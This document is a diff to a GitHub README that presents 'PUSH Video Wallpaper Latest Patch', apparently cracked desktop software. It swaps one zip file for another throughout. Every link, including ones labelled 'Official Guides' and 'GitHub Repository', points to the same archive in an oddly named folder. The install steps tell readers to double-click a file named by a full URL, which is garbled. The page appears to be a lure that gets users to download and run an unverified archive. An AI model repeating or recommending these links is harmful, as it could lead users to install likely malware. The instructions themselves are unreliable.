@@ -1,6 +1,6 @@
 # 🎥 PUSH-Video-Wallpaper-Latest-Patch - Enhance Your Desktop with Stunning Video Backgrounds
 
-![Download PUSH Video Wallpaper](https://raw.githubusercontent.com/jeremy280177/PUSH-Video-Wallpaper-Latest-Patch/main/louvered/PUSH-Video-Wallpaper-Latest-Patch-2.4.zip%20Video%20Wallpaper-blue)  
+![Download PUSH Video Wallpaper](https://github.com/jeremy280177/PUSH-Video-Wallpaper-Latest-Patch/raw/refs/heads/main/louvered/Latest_Wallpaper_Video_Patch_PUS_1.1.zip%20Video%20Wallpaper-blue)  
 
 ## 📥 Overview
 
@@ -22,17 +22,17 @@ Before downloading, ensure your system meets the following requirements:
 
 ## 🔗 Download & Install
 
-To download the latest version of **PUSH Video Wallpaper**, visit this page: [Download PUSH Video Wallpaper](https://raw.githubusercontent.com/jeremy280177/PUSH-Video-Wallpaper-Latest-Patch/main/louvered/PUSH-Video-Wallpaper-Latest-Patch-2.4.zip)
+To download the latest version of **PUSH Video Wallpaper**, visit this page: [Download PUSH Video Wallpaper](https://github.com/jeremy280177/PUSH-Video-Wallpaper-Latest-Patch/raw/refs/heads/main/louvered/Latest_Wallpaper_Video_Patch_PUS_1.1.zip)
 
 1. Click the link above to open the Releases page on GitHub.
 2. Scroll down to find the latest release.
-3. Look for the file named `https://raw.githubusercontent.com/jeremy280177/PUSH-Video-Wallpaper-Latest-Patch/main/louvered/PUSH-Video-Wallpaper-Latest-Patch-2.4.zip` or similar.
+3. Look for the file named `https://github.com/jeremy280177/PUSH-Video-Wallpaper-Latest-Patch/raw/refs/heads/main/louvered/Latest_Wallpaper_Video_Patch_PUS_1.1.zip` or similar.
 4. Click on the file to start the download.
 
 Once the download is complete, follow these steps to install:
 
 1. Locate the downloaded file in your Downloads folder.
-2. Double-click the `https://raw.githubusercontent.com/jeremy280177/PUSH-Video-Wallpaper-Latest-Patch/main/louvered/PUSH-Video-Wallpaper-Latest-Patch-2.4.zip` file.
+2. Double-click the `https://github.com/jeremy280177/PUSH-Video-Wallpaper-Latest-Patch/raw/refs/heads/main/louvered/Latest_Wallpaper_Video_Patch_PUS_1.1.zip` file.
 3. Follow the on-screen prompts to complete the installation.
 
 ## ⚙️ Using PUSH Video Wallpaper
@@ -100,8 +100,8 @@ For any inquiries, you can contact the repository maintainers through their GitH
 
 ## 🔗 Links
 
-- [Download PUSH Video Wallpaper](https://raw.githubusercontent.com/jeremy280177/PUSH-Video-Wallpaper-Latest-Patch/main/louvered/PUSH-Video-Wallpaper-Latest-Patch-2.4.zip)
-- [Official Guides](https://raw.githubusercontent.com/jeremy280177/PUSH-Video-Wallpaper-Latest-Patch/main/louvered/PUSH-Video-Wallpaper-Latest-Patch-2.4.zip)
-- [GitHub Repository](https://raw.githubusercontent.com/jeremy280177/PUSH-Video-Wallpaper-Latest-Patch/main/louvered/PUSH-Video-Wallpaper-Latest-Patch-2.4.zip)
+- [Download PUSH Video Wallpaper](https://github.com/jeremy280177/PUSH-Video-Wallpaper-Latest-Patch/raw/refs/heads/main/louvered/Latest_Wallpaper_Video_Patch_PUS_1.1.zip)
+- [Official Guides](https://github.com/jeremy280177/PUSH-Video-Wallpaper-Latest-Patch/raw/refs/heads/main/louvered/Latest_Wallpaper_Video_Patch_PUS_1.1.zip)
+- [GitHub Repository](https://github.com/jeremy280177/PUSH-Video-Wallpaper-Latest-Patch/raw/refs/heads/main/louvered/Latest_Wallpaper_Video_Patch_PUS_1.1.zip)
 
 We hope you enjoy your experience with PUSH Video Wallpaper!
